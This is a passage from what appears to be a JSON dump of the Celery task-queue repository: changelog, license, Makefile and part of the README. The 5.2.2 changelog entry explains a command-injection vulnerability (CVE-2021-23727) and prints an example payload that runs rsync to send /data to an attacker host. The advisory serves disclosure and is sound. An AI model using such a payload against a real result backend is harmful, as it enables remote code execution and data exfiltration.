test_all_tasks_of_canvas_are_stamped() by @Nusnus in #7931\n- Added new example for the stamping mechanism: examples/stamping by @Nusnus in #7933\n- Fixed a bug where replacing a stamped task and stamping it again by @Nusnus in #7934\n- Bugfix for nested group stamping on task replace by @Nusnus in #7935\n- Added integration test test_stamping_example_canvas() by @Nusnus in #7937\n- Fixed a bug in losing chain links when unchaining an inner chain with links by @Nusnus in #7938\n- Removing as not mandatory by @auvipy in #7885\n- Housekeeping for Canvas.py by @Nusnus in #7942\n- Scheduled weekly dependency update for week 50 by @pyup-bot in #7954\n- try pypy 3.9 in CI by @auvipy in #7956\n- sqlalchemy==1.4.45 by @auvipy in #7943\n- billiard>=4.1.0,<5.0 by @auvipy in #7957\n- feat(typecheck): allow changing type check behavior on the app level; by @moaddib666 in #7952\n- Add broker_channel_error_retry option by @nkns165 in #7951\n- Add beat_cron_starting_deadline_seconds to prevent unwanted cron runs by @abs25 in #7945\n- Scheduled weekly dependency update for week 51 by @pyup-bot in #7965\n- Added doc to \"retry_errors\" newly supported field of \"publish_retry_policy\" of the task namespace by @Nusnus in #7967\n- Renamed from master to main in the docs and the CI workflows by @Nusnus in #7968\n- Fix docs for the exchange to use with worker_direct by @alessio-b2c2 in #7973\n- Pin redis==4.3.4 by @auvipy in #7974\n- return list of nodes to make sphinx extension compatible with Sphinx 6.0 by @mathiasertl in #7978\n- use version range redis>=4.2.2,<4.4.0 by @auvipy in #7980\n- Scheduled weekly dependency update for week 01 by @pyup-bot in #7987\n- Add annotations to minimise differences with celery-aio-pool's tracer.py. by @ShaheedHaque in #7925\n- Fixed bug where linking a stamped task did not add the stamp to the link's options by @Nusnus in #7992\n- sqlalchemy==1.4.46 by @auvipy in #7995\n- pytz by @auvipy in #8002\n- Fix few typos, provide configuration + workflow for codespell to catch any new by @yarikoptic in #8023\n- RabbitMQ links update by @arnisjuraga in #8031\n- Ignore files generated by tests by @Kludex in #7846\n- Revert \"sqlalchemy==1.4.46 (#7995)\" by @Nusnus in #8033\n- Fixed bug with replacing a stamped task with a chain or a group (inc. links/errlinks) by @Nusnus in #8034\n- Fixed formatting in setup.cfg that caused flake8 to misbehave by @Nusnus in #8044\n- Removed duplicated import Iterable by @Nusnus in #8046\n- Fix docs by @Nusnus in #8047\n- Document --logfile default by @strugee in #8057\n- Stamping Mechanism Refactoring by @Nusnus in #8045\n- result_backend_thread_safe config shares backend across threads by @CharlieTruong in #8058\n- Fix cronjob that use day of month and negative UTC timezone by @pkyosx in #8053\n- Stamping Mechanism Examples Refactoring by @Nusnus in #8060\n- Fixed bug in Task.on_stamp_replaced() by @Nusnus in #8061\n- Stamping Mechanism Refactoring 2 by @Nusnus in #8064\n- Changed default append_stamps from True to False (meaning duplicates … by @Nusnus in #8068\n- typo in comment: mailicious => malicious by @yanick in #8072\n- Fix command for starting flower with specified broker URL by @ShukantPal in #8071\n- Improve documentation on ETA/countdown tasks (#8069) by @norbertcyran in #8075\n\n.. _version-5.3.0b1:\n\n5.3.0b1\n=======\n\n:release-date: 2022-08-01 5:15 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Canvas Header Stamping (#7384).\n- async chords should pass it's kwargs to the group/body.\n- beat: Suppress banner output with the quiet option (#7608).\n- Fix honor Django's TIME_ZONE setting.\n- Don't warn about DEBUG=True for Django.\n- Fixed the on_after_finalize cannot access tasks due to deadlock.\n- Bump kombu>=5.3.0b1,<6.0.\n- Make default worker state limits configurable (#7609).\n- Only clear the cache if there are no active writers.\n- Billiard 4.0.1\n\n.. _version-5.3.0a1:\n\n5.3.0a1\n=======\n\n:release-date: 2022-06-29 5:15 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Remove Python 3.4 compatibility code.\n- call ping to set connection attr for avoiding redis parse_response error.\n- Use importlib instead of deprecated pkg_resources.\n- fix #7245 uid duplicated in command params.\n- Fix subscribed_to maybe empty (#7232).\n- Fix: Celery beat sleeps 300 seconds sometimes even when it should run a task within a few seconds (e.g. 13 seconds) #7290.\n- Add security_key_password option (#7292).\n- Limit elasticsearch support to below version 8.0.\n- try new major release of pytest 7 (#7330).\n- broker_connection_retry should no longer apply on startup (#7300).\n- Remove __ne__ methods (#7257).\n- fix #7200 uid and gid.\n- Remove exception-throwing from the signal handler.\n- Add mypy to the pipeline (#7383).\n- Expose more debugging information when receiving unknown tasks. (#7405)\n- Avoid importing buf_t from billiard's compat module as it was removed.\n- Avoid negating a constant in a loop. (#7443)\n- Ensure expiration is of float type when migrating tasks (#7385).\n- load_extension_class_names - correct module_name (#7406)\n- Bump pymongo[srv]>=4.0.2.\n- Use inspect.getgeneratorstate in asynpool.gen_not_started (#7476).\n- Fix test with missing .get() (#7479).\n- azure-storage-blob>=12.11.0\n- Make start_worker, setup_default_app reusable outside of pytest.\n- Ensure a proper error message is raised when id for key is empty (#7447).\n- Crontab string representation does not match UNIX crontab expression.\n- Worker should exit with ctx.exit to get the right exitcode for non-zero.\n- Fix expiration check (#7552).\n- Use callable built-in.\n- Include dont_autoretry_for option in tasks. (#7556)\n- fix: Syntax error in arango query.\n- Fix custom headers propagation on task retries (#7555).\n- Silence backend warning when eager results are stored.\n- Reduce prefetch count on restart and gradually restore it (#7350).\n- Improve workflow primitive subclassing (#7593).\n- test kombu>=5.3.0a1,<6.0 (#7598).\n- Canvas Header Stamping (#7384).\n\n.. _version-5.2.7:\n\n5.2.7\n=====\n\n:release-date: 2022-5-26 12:15 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Fix packaging issue which causes poetry 1.2b1 and above to fail install Celery (#7534).\n\n.. _version-5.2.6:\n\n5.2.6\n=====\n\n:release-date: 2022-4-04 21:15 P.M UTC+2:00\n:release-by: Omer Katz\n\n- load_extension_class_names - correct module_name (#7433).\n    This fixes a regression caused by #7218.\n\n.. _version-5.2.5:\n\n5.2.5\n=====\n\n:release-date: 2022-4-03 20:42 P.M UTC+2:00\n:release-by: Omer Katz\n\n**This release was yanked due to a regression caused by the PR below**\n\n- Use importlib instead of deprecated pkg_resources (#7218).\n\n.. _version-5.2.4:\n\n5.2.4\n=====\n\n:release-date: 2022-4-03 20:30 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Expose more debugging information when receiving unknown tasks (#7404).\n\n.. _version-5.2.3:\n\n5.2.3\n=====\n\n:release-date: 2021-12-29 12:00 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Allow redis >= 4.0.2.\n- Upgrade minimum required pymongo version to 3.11.1.\n- tested pypy3.8 beta (#6998).\n- Split Signature.__or__ into subclasses' __or__ (#7135).\n- Prevent duplication in event loop on Consumer restart.\n- Restrict setuptools>=59.1.1,<59.7.0.\n- Kombu bumped to v5.2.3\n- py-amqp bumped to v5.0.9\n- Some docs & CI improvements.\n\n\n.. _version-5.2.2:\n\n5.2.2\n=====\n\n:release-date: 2021-12-26 16:30 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Various documentation fixes.\n- Fix CVE-2021-23727 (Stored Command Injection security vulnerability).\n\n    When a task fails, the failure information is serialized in the backend.\n    In some cases, the exception class is only importable from the\n    consumer's code base. In this case, we reconstruct the exception class\n    so that we can re-raise the error on the process which queried the\n    task's result. This was introduced in #4836.\n    If the recreated exception type isn't an exception, this is a security issue.\n    Without the condition included in this patch, an attacker could inject a remote code execution instruction such as:\n    ``os.system(\"rsync /data attacker@192.168.56.100:~/data\")``\n    by setting the task's result to a failure in the result backend with the os,\n    the system function as the exception type and the payload ``rsync /data attacker@192.168.56.100:~/data`` as the exception arguments like so:\n\n    .. code-block:: python\n\n        {\n              \"exc_module\": \"os\",\n              'exc_type': \"system\",\n              \"exc_message\": \"rsync /data attacker@192.168.56.100:~/data\"\n        }\n\n    According to my analysis, this vulnerability can only be exploited if\n    the producer delayed a task which runs long enough for the\n    attacker to change the result mid-flight, and the producer has\n    polled for the task's result.\n    The attacker would also have to gain access to the result backend.\n    The severity of this security vulnerability is low, but we still\n    recommend upgrading.\n\n\n.. _version-5.2.1:\n\n5.2.1\n=====\n\n:release-date: 2021-11-16 8.55 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Fix rstrip usage on bytes instance in ProxyLogger.\n- Pass logfile to ExecStop in celery.service example systemd file.\n- fix: reduce latency of AsyncResult.get under gevent (#7052)\n- Limit redis version: <4.0.0.\n- Bump min kombu version to 5.2.2.\n- Change pytz>dev to a PEP 440 compliant pytz>0.dev.0.\n- Remove dependency to case (#7077).\n- fix: task expiration is timezone aware if needed (#7065).\n- Initial testing of pypy-3.8 beta to CI.\n- Docs, CI & tests cleanups.\n\n\n.. _version-5.2.0:\n\n5.2.0\n=====\n\n:release-date: 2021-11-08 7.15 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Prevent from subscribing to empty channels (#7040)\n- fix register_task method.\n- Fire task failure signal on final reject (#6980)\n- Limit pymongo version: <3.12.1 (#7041)\n- Bump min kombu version to 5.2.1\n\n.. _version-5.2.0rc2:\n\n5.2.0rc2\n========\n\n:release-date: 2021-11-02 1.54 P.M UTC+3:00\n:release-by: Naomi Elstein\n\n- Bump Python 3.10.0 to rc2.\n- [pre-commit.ci] pre-commit autoupdate (#6972).\n- autopep8.\n- Prevent worker to send expired revoked items upon hello command (#6975).\n- docs: clarify the 'keeping results' section (#6979).\n- Update deprecated task module removal in 5.0 documentation (#6981).\n- [pre-commit.ci] pre-commit autoupdate.\n- try python 3.10 GA.\n- mention python 3.10 on readme.\n- Documenting the default consumer_timeout value for rabbitmq >= 3.8.15.\n- Azure blockblob backend parametrized connection/read timeouts (#6978).\n- Add as_uri method to azure block blob backend.\n- Add possibility to override backend implementation with celeryconfig (#6879).\n- [pre-commit.ci] pre-commit autoupdate.\n- try to fix deprecation warning.\n- [pre-commit.ci] pre-commit autoupdate.\n- not needed anyore.\n- not needed anyore.\n- not used anymore.\n- add github discussions forum\n\n.. _version-5.2.0rc1:\n\n5.2.0rc1\n========\n:release-date: 2021-09-26 4.04 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Kill all workers when main process exits in prefork model (#6942).\n- test kombu 5.2.0rc1 (#6947).\n- try moto 2.2.x (#6948).\n- Prepared Hacker News Post on Release Action.\n- update setup with python 3.7 as minimum.\n- update kombu on setupcfg.\n- Added note about automatic killing all child processes of worker after its termination.\n- [pre-commit.ci] pre-commit autoupdate.\n- Move importskip before greenlet import (#6956).\n- amqp: send expiration field to broker if requested by user (#6957).\n- Single line drift warning.\n- canvas: fix kwargs argument to prevent recursion (#6810) (#6959).\n- Allow to enable Events with app.conf mechanism.\n- Warn when expiration date is in the past.\n- Add the Framework :: Celery trove classifier.\n- Give indication whether the task is replacing another (#6916).\n- Make setup.py executable.\n- Bump version: 5.2.0b3 → 5.2.0rc1.\n\n.. _version-5.2.0b3:\n\n5.2.0b3\n=======\n\n:release-date: 2021-09-02 8.38 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Add args to LOG_RECEIVED (fixes #6885) (#6898).\n- Terminate job implementation for eventlet concurrency backend (#6917).\n- Add cleanup implementation to filesystem backend (#6919).\n- [pre-commit.ci] pre-commit autoupdate (#69).\n- Add before_start hook (fixes #4110) (#6923).\n- Restart consumer if connection drops (#6930).\n- Remove outdated optimization documentation (#6933).\n- added https verification check functionality in arangodb backend (#6800).\n- Drop Python 3.6 support.\n- update supported python versions on readme.\n- [pre-commit.ci] pre-commit autoupdate (#6935).\n- Remove appveyor configuration since we migrated to GA.\n- pyugrade is now set to upgrade code to 3.7.\n- Drop exclude statement since we no longer test with pypy-3.6.\n- 3.10 is not GA so it's not supported yet.\n- Celery 5.1 or earlier support Python 3.6.\n- Fix linting error.\n- fix: Pass a Context when chaining fail results (#6899).\n- Bump version: 5.2.0b2 → 5.2.0b3.\n\n.. _version-5.2.0b2:\n\n5.2.0b2\n=======\n\n:release-date: 2021-08-17 5.35 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Test windows on py3.10rc1 and pypy3.7 (#6868).\n- Route chord_unlock task to the same queue as chord body (#6896).\n- Add message properties to app.tasks.Context (#6818).\n- handle already converted LogLevel and JSON (#6915).\n- 5.2 is codenamed dawn-chorus.\n- Bump version: 5.2.0b1 → 5.2.0b2.\n\n.. _version-5.2.0b1:\n\n5.2.0b1\n=======\n\n:release-date: 2021-08-11 5.42 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Add Python 3.10 support (#6807).\n- Fix docstring for Signal.send to match code (#6835).\n- No blank line in log output (#6838).\n- Chords get body_type independently to handle cases where body.type does not exist (#6847).\n- Fix #6844 by allowing safe queries via app.inspect().active() (#6849).\n- Fix multithreaded backend usage (#6851).\n- Fix Open Collective donate button (#6848).\n- Fix setting worker concurrency option after signal (#6853).\n- Make ResultSet.on_ready promise hold a weakref to self (#6784).\n- Update configuration.rst.\n- Discard jobs on flush if synack isn't enabled (#6863).\n- Bump click version to 8.0 (#6861).\n- Amend IRC network link to Libera (#6837).\n- Import celery lazily in pytest plugin and unignore flake8 F821, \"undefined name '...'\" (#6872).\n- Fix inspect --json output to return valid json without --quiet.\n- Remove celery.task references in modules, docs (#6869).\n-  The Consul backend must correctly associate requests and responses (#6823).\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 2.65,
          "content": "Copyright (c) 2017-2026 Asif Saif Uddin, core team & contributors. All rights reserved.\nCopyright (c) 2015-2016 Ask Solem & contributors. All rights reserved.\nCopyright (c) 2012-2014 GoPivotal, Inc.  All rights reserved.\nCopyright (c) 2009, 2010, 2011, 2012 Ask Solem, and individual contributors. All rights reserved.\n\nCelery is licensed under The BSD License (3 Clause, also known as\nthe new BSD license).  The license is an OSI approved Open Source\nlicense and is GPL-compatible(1).\n\nThe license text can also be found here:\nhttp://www.opensource.org/licenses/BSD-3-Clause\n\nLicense\n=======\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are met:\n    * Redistributions of source code must retain the above copyright\n      notice, this list of conditions and the following disclaimer.\n    * Redistributions in binary form must reproduce the above copyright\n      notice, this list of conditions and the following disclaimer in the\n      documentation and/or other materials provided with the distribution.\n    * Neither the name of Ask Solem, nor the\n      names of its contributors may be used to endorse or promote products\n      derived from this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\nAND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,\nTHE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\nPURPOSE ARE DISCLAIMED. IN NO EVENT SHALL Ask Solem OR CONTRIBUTORS\nBE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\nCONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\nSUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\nINTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\nCONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\nARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\nPOSSIBILITY OF SUCH DAMAGE.\n\nDocumentation License\n=====================\n\nThe documentation portion of Celery (the rendered contents of the\n\"docs\" directory of a software distribution or checkout) is supplied\nunder the \"Creative Commons Attribution-ShareAlike 4.0\nInternational\" (CC BY-SA 4.0) License as described by\nhttps://creativecommons.org/licenses/by-sa/4.0/\n\nFootnotes\n=========\n(1) A GPL-compatible license makes it possible to\n    combine Celery with other software that is released\n    under the GPL, it does not mean that we're distributing\n    Celery under the GPL license.  The BSD license, unlike the GPL,\n    let you distribute a modified version without making your\n    changes open source.\n"
        },
        {
          "name": "MANIFEST.in",
          "type": "blob",
          "size": 0.69,
          "content": "include CONTRIBUTORS.txt\ninclude Changelog.rst\ninclude LICENSE\ninclude README.rst\ninclude MANIFEST.in\ninclude TODO\ninclude setup.cfg\ninclude setup.py\n\nrecursive-include t *.py *.rst\nrecursive-include docs *\nrecursive-include extra/bash-completion *\nrecursive-include extra/centos *\nrecursive-include extra/generic-init.d *\nrecursive-include extra/macOS *\nrecursive-include extra/supervisord *\nrecursive-include extra/systemd *\nrecursive-include extra/zsh-completion *\nrecursive-include examples *\nrecursive-include requirements *.txt *.rst\nrecursive-include celery/utils/static *.png\n\nrecursive-exclude docs/_build *\nrecursive-exclude * __pycache__\nrecursive-exclude * *.py[co]\nrecursive-exclude * .*.sw[a-z]\n"
        },
        {
          "name": "Makefile",
          "type": "blob",
          "size": 5.94,
          "content": "PROJ=celery\nPGPIDENT=\"Celery Security Team\"\nPYTHON=python\nPYTEST=pytest\nGIT=git\nTOX=tox\nICONV=iconv\nFLAKE8=flake8\nPYROMA=pyroma\nFLAKEPLUS=flakeplus\nSPHINX2RST=sphinx2rst\nRST2HTML=rst2html.py\nDEVNULL=/dev/null\n\nTESTDIR=t\n\nSPHINX_DIR=docs/\nSPHINX_BUILDDIR=\"${SPHINX_DIR}/_build\"\nREADME=README.rst\nREADME_SRC=\"docs/templates/readme.txt\"\nCONTRIBUTING=CONTRIBUTING.rst\nCONTRIBUTING_SRC=\"docs/contributing.rst\"\nSPHINX_HTMLDIR=\"${SPHINX_BUILDDIR}/html\"\nDOCUMENTATION=Documentation\nFLAKEPLUSTARGET=2.7\n\nWORKER_GRAPH=\"docs/images/worker_graph_full.png\"\n\nall: help\n\nhelp:\n\t@echo \"docs                 - Build documentation.\"\n\t@echo \"test-all             - Run tests for all supported python versions.\"\n\t@echo \"distcheck ---------- - Check distribution for problems.\"\n\t@echo \"  test               - Run unittests using current python.\"\n\t@echo \"  lint ------------  - Check codebase for problems.\"\n\t@echo \"    apicheck         - Check API reference coverage.\"\n\t@echo \"    configcheck      - Check configuration reference coverage.\"\n\t@echo \"    readmecheck      - Check README.rst encoding.\"\n\t@echo \"    contribcheck     - Check CONTRIBUTING.rst encoding\"\n\t@echo \"    flakes --------  - Check code for syntax and style errors.\"\n\t@echo \"      flakecheck     - Run flake8 on the source code.\"\n\t@echo \"      flakepluscheck - Run flakeplus on the source code.\"\n\t@echo \"readme               - Regenerate README.rst file.\"\n\t@echo \"contrib              - Regenerate CONTRIBUTING.rst file\"\n\t@echo \"clean-dist --------- - Clean all distribution build artifacts.\"\n\t@echo \"  clean-git-force    - Remove all uncommitted files.\"\n\t@echo \"  clean ------------ - Non-destructive clean\"\n\t@echo \"    clean-pyc        - Remove .pyc/__pycache__ files\"\n\t@echo \"    clean-docs       - Remove documentation build artifacts.\"\n\t@echo \"    clean-build      - Remove setup artifacts.\"\n\t@echo \"bump                 - Bump patch version number.\"\n\t@echo \"bump-minor           - Bump minor version number.\"\n\t@echo \"bump-major           - Bump major version number.\"\n\t@echo \"release              - Make PyPI release.\"\n\t@echo \"\"\n\t@echo \"Docker-specific commands:\"\n\t@echo \"  docker-build\t\t\t- Build celery docker container.\"\n\t@echo \"  docker-lint        \t\t- Run tox -e lint on docker container.\"\n\t@echo \"  docker-unit-tests\t\t- Run unit tests on docker container, use '-- -k <TEST NAME>' for specific test run.\"\n\t@echo \"  docker-bash        \t\t- Get a bash shell inside the container.\"\n\t@echo \"  docker-docs\t\t\t- Build documentation with docker.\"\n\nclean: clean-docs clean-pyc clean-build\n\nclean-dist: clean clean-git-force\n\nbump:\n\tbumpversion patch\n\nbump-minor:\n\tbumpversion minor\n\nbump-major:\n\tbumpversion major\n\nrelease:\n\tpython setup.py register sdist bdist_wheel upload --sign --identity=\"$(PGPIDENT)\"\n\nDocumentation:\n\t(cd \"$(SPHINX_DIR)\"; $(MAKE) html)\n\tmv \"$(SPHINX_HTMLDIR)\" $(DOCUMENTATION)\n\ndocs: clean-docs Documentation\n\nclean-docs:\n\t-rm -rf \"$(SPHINX_BUILDDIR)\" \"$(DOCUMENTATION)\"\n\nlint: flakecheck apicheck configcheck readmecheck\n\napicheck:\n\t(cd \"$(SPHINX_DIR)\"; $(MAKE) apicheck)\n\nconfigcheck:\n\t(cd \"$(SPHINX_DIR)\"; $(MAKE) configcheck)\n\nflakecheck:\n\t$(FLAKE8) \"$(PROJ)\" \"$(TESTDIR)\"\n\nflakediag:\n\t-$(MAKE) flakecheck\n\nflakepluscheck:\n\t$(FLAKEPLUS) --$(FLAKEPLUSTARGET) \"$(PROJ)\" \"$(TESTDIR)\"\n\nflakeplusdiag:\n\t-$(MAKE) flakepluscheck\n\nflakes: flakediag flakeplusdiag\n\nclean-readme:\n\t-rm -f $(README)\n\nreadmecheck-unicode:\n\t$(ICONV) -f ascii -t ascii $(README) >/dev/null\n\nreadmecheck-rst:\n\t-$(RST2HTML) $(README) >$(DEVNULL)\n\nreadmecheck: readmecheck-unicode readmecheck-rst\n\n$(README):\n\t$(SPHINX2RST) \"$(README_SRC)\" --ascii > $@\n\nreadme: clean-readme $(README) readmecheck\n\nclean-contrib:\n\t-rm -f \"$(CONTRIBUTING)\"\n\n$(CONTRIBUTING):\n\t$(SPHINX2RST) \"$(CONTRIBUTING_SRC)\" > $@\n\ncontrib: clean-contrib $(CONTRIBUTING)\n\nclean-pyc:\n\t-find . -type f -a \\( -name \"*.pyc\" -o -name \"*$$py.class\" \\) | xargs -r rm\n\t-find . -type d -name \"__pycache__\" | xargs -r rm -r\n\nremovepyc: clean-pyc\n\nclean-build:\n\trm -rf build/ dist/ .eggs/ *.egg-info/ .coverage cover/\n\nclean-git:\n\t$(GIT) clean -xdn\n\nclean-git-force:\n\t$(GIT) clean -xdf\n\ntest-all: clean-pyc\n\t$(TOX)\n\ntest:\n\t$(PYTHON) setup.py test\n\ncov:\n\t$(PYTEST) -x --cov=\"$(PROJ)\" --cov-report=html\n\nbuild:\n\t$(PYTHON) setup.py sdist bdist_wheel\n\ndistcheck: lint test clean\n\ndist: readme contrib clean-dist build\n\n\n$(WORKER_GRAPH):\n\t$(PYTHON) -m celery graph bootsteps | dot -Tpng -o $@\n\nclean-graph:\n\t-rm -f $(WORKER_GRAPH)\n\ngraph: clean-graph $(WORKER_GRAPH)\n\nauthorcheck:\n\tgit shortlog -se | cut -f2 | extra/release/attribution.py\n\n.PHONY: docker-build\ndocker-build:\n\t@docker compose -f docker/docker-compose.yml build\n\n.PHONY: docker-lint\ndocker-lint:\n\t@docker compose -f docker/docker-compose.yml run --rm -w /home/developer/celery celery tox -e lint\n\n.PHONY: docker-unit-tests\ndocker-unit-tests:\n\t@docker compose -f docker/docker-compose.yml run --rm -w /home/developer/celery celery tox -e 3.12-unit -- $(filter-out $@,$(MAKECMDGOALS))\n\n# Integration tests are not fully supported when running in a docker container yet so we allow them to\n# gracefully fail until fully supported.\n# TODO: Add documentation (in help command) when fully supported.\n.PHONY: docker-integration-tests\ndocker-integration-tests:\n\t@docker compose -f docker/docker-compose.yml run --rm -w /home/developer/celery celery tox -e 3.12-integration-docker -- --maxfail=1000\n\n.PHONY: docker-bash\ndocker-bash:\n\t@docker compose -f docker/docker-compose.yml run --rm -w /home/developer/celery celery bash\n\n.PHONY: docker-docs\ndocker-docs:\n\t@docker compose -f docker/docker-compose.yml up --build -d docs\n\t@echo \"Waiting 60 seconds for docs service to build the documentation inside the container...\"\n\t@timeout 60 sh -c 'until docker logs $$(docker compose -f docker/docker-compose.yml ps -q docs) 2>&1 | \\\n\t\tgrep \"build succeeded\"; do sleep 1; done' || \\\n\t\t(echo \"Error! - run manually: docker compose -f ./docker/docker-compose.yml up --build docs\"; \\\n\tdocker compose -f docker/docker-compose.yml logs --tail=50 docs; false)\n\t@docker compose -f docker/docker-compose.yml down\n\n.PHONY: catch-all\n%: catch-all\n\t@:\n"
        },
        {
          "name": "README.rst",
          "type": "blob",
          "size": 16.6,
          "content": ".. image:: https://docs.celeryq.dev/en/latest/_images/celery-banner-small.png\n\n|build-status| |coverage| |license| |wheel| |semgrep| |pyversion| |pyimp| |ocbackerbadge| |ocsponsorbadge|\n\n:Version: 5.5.0rc4 (immunity)\n:Web: https://docs.celeryq.dev/en/stable/index.html\n:Download: https://pypi.org/project/celery/\n:Source: https://github.com/celery/celery/\n:Keywords: task, queue, job, async, rabbitmq, amqp, redis,\n  python, distributed, actors\n\nDonations\n=========\n\nThis project relies on your generous donations.\n\nIf you are using Celery to create a commercial product, please consider becoming our `backer`_ or our `sponsor`_ to ensure Celery's future.\n\n.. _`backer`: https://opencollective.com/celery#backer\n.. _`sponsor`: https://opencollective.com/celery#sponsor\n\nFor enterprise\n==============\n\nAvailable as part of the Tidelift Subscription.\n\nThe maintainers of ``celery`` and thousands of other packages are working with Tidelift to deliver commercial support and maintenance for the open source dependencies you use to build your applications. Save time, reduce risk, and improve code health, while paying the maintainers of the exact dependencies you use. `Learn more. <https://tidelift.com/subscription/pkg/pypi-celery?utm_source=pypi-celery&utm_medium=referral&utm_campaign=enterprise&utm_term=repo>`_\n\n\nSponsor\n=======\n\n`Dragonfly <https://www.dragonflydb.io/>`_ is a drop-in Redis replacement that cuts costs and boosts performance. Designed to fully utilize the power of modern cloud hardware and deliver on the data demands of modern applications, Dragonfly frees developers from the limits of traditional in-memory data stores.\n\n\n.. image:: https://github.com/celery/celery/raw/main/docs/images/dragonfly.svg\n   :alt: Dragonfly logo\n   :width: 150px\n\n\n\n\n\nWhat's a Task Queue?\n====================\n\nTask queues are used as a mechanism to distribute work across threads or\nmachines.\n\nA task queue's input is a unit of work, called a task, dedicated worker\nprocesses then constantly monitor the queue for new work to perform.\n\nCelery communicates via messages, usually using a broker\nto mediate between clients and workers. To initiate a task a client puts a\nmessage on the queue, the broker then delivers the message to a worker.\n\nA Celery system can consist of multiple workers and brokers, giving way\nto high availability and horizontal scaling.\n\nCelery is written in Python, but the protocol can be implemented in any\nlanguage. In addition to Python there's node-celery_ for Node.js,\na `PHP client`_, `gocelery`_, gopher-celery_ for Go, and rusty-celery_ for Rust.\n\nLanguage interoperability can also be achieved by using webhooks\nin such a way that the client enqueues an URL to be requested by a worker.\n\n.. _node-celery: https://github.com/mher/node-celery\n.. _`PHP client`: https://github.com/gjedeer/celery-php\n.. _`gocelery`: https://github.com/gocelery/gocelery\n.. _gopher-celery: https://github.com/marselester/gopher-celery\n.. _rusty-celery: https://github.com/rusty-celery/rusty-celery\n\nWhat do I need?\n===============\n\nCelery version 5.5.x runs on:\n\n- Python (3.8, 3.9, 3.10, 3.11, 3.12, 3.13)\n- PyPy3.9+ (v7.3.12+)\n\n\nThis is the version of celery which will support Python 3.8 or newer.\n\nIf you're running an older version of Python, you need to be running\nan older version of Celery:\n\n- Python 3.7: Celery 5.2 or earlier.\n- Python 3.6: Celery 5.1 or earlier.\n- Python 2.7: Celery 4.x series.\n- Python 2.6: Celery series 3.1 or earlier.\n- Python 2.5: Celery series 3.0 or earlier.\n- Python 2.4: Celery series 2.2 or earlier.\n\nCelery is a project with minimal funding,\nso we don't support Microsoft Windows but it should be working.\nPlease don't open any issues related to that platform.\n\n*Celery* is usually used with a message broker to send and receive messages.\nThe RabbitMQ, Redis transports are feature complete,\nbut there's also experimental support for a myriad of other solutions, including\nusing SQLite for local development.\n\n*Celery* can run on a single machine, on multiple machines, or even\nacross datacenters.\n\nGet Started\n===========\n\nIf this is the first time you're trying to use Celery, or you're\nnew to Celery v5.5.x coming from previous versions then you should read our\ngetting started tutorials:\n\n- `First steps with Celery`_\n\n    Tutorial teaching you the bare minimum needed to get started with Celery.\n\n- `Next steps`_\n\n    A more complete overview, showing more features.\n\n.. _`First steps with Celery`:\n    https://docs.celeryq.dev/en/stable/getting-started/first-steps-with-celery.html\n\n.. _`Next steps`:\n    https://docs.celeryq.dev/en/stable/getting-started/next-steps.html\n\n You can also get started with Celery by using a hosted broker transport CloudAMQP. The largest hosting provider of RabbitMQ is a proud sponsor of Celery.\n\nCelery is...\n=============\n\n- **Simple**\n\n    Celery is easy to use and maintain, and does *not need configuration files*.\n\n    It has an active, friendly community you can talk to for support,\n    like at our `mailing-list`_, or the IRC channel.\n\n    Here's one of the simplest applications you can make:\n\n    .. code-block:: python\n\n        from celery import Celery\n\n        app = Celery('hello', broker='amqp://guest@localhost//')\n\n        @app.task\n        def hello():\n            return 'hello world'\n\n- **Highly Available**\n\n    Workers and clients will automatically retry in the event\n    of connection loss or failure, and some brokers support\n    HA in way of *Primary/Primary* or *Primary/Replica* replication.\n\n- **Fast**\n\n    A single Celery process can process millions of tasks a minute,\n    with sub-millisecond round-trip latency (using RabbitMQ,\n    py-librabbitmq, and optimized settings).\n\n- **Flexible**\n\n    Almost every part of *Celery* can be extended or used on its own,\n    Custom pool implementations, serializers, compression schemes, logging,\n    schedulers, consumers, producers, broker transports, and much more.\n\nIt supports...\n================\n\n    - **Message Transports**\n\n        - RabbitMQ_, Redis_, Amazon SQS, Google Pub/Sub\n\n    - **Concurrency**\n\n        - Prefork, Eventlet_, gevent_, single threaded (``solo``)\n\n    - **Result Stores**\n\n        - AMQP, Redis\n        - memcached\n        - SQLAlchemy, Django ORM\n        - Apache Cassandra, IronCache, Elasticsearch\n        - Google Cloud Storage\n\n    - **Serialization**\n\n        - *pickle*, *json*, *yaml*, *msgpack*.\n        - *zlib*, *bzip2* compression.\n        - Cryptographic message signing.\n\n.. _`Eventlet`: http://eventlet.net/\n.. _`gevent`: http://gevent.org/\n\n.. _RabbitMQ: https://rabbitmq.com\n.. _Redis: https://redis.io\n.. _SQLAlchemy: http://sqlalchemy.org\n\nFramework Integration\n=====================\n\nCelery is easy to integrate with web frameworks, some of which even have\nintegration packages:\n\n    +--------------------+------------------------+\n    | `Django`_          | not needed             |\n    +--------------------+------------------------+\n    | `Pyramid`_         | `pyramid_celery`_      |\n    +--------------------+------------------------+\n    | `Pylons`_          | `celery-pylons`_       |\n    